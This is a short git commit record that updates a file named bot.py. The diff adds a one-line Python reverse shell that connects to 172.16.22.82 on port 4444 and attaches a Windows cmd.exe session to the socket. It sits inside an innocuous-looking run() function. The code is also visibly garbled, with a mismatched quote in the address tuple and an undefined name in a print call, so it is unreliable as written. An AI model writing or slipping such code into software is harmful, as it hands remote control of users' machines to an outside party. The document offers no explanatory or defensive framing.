64d0a27a79ce3c1e740d9dfbefaa532abff43e48
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 19:27:00 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,10 +1,3 @@
 def run():
-  import os 
-  import socket
-  import subprocess
-  print("Adios, mundo!")
-  HOST = '172.16.22.82'
-  PORT = 4444
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
+  print(caca)
+  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('172.16.22.82,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);
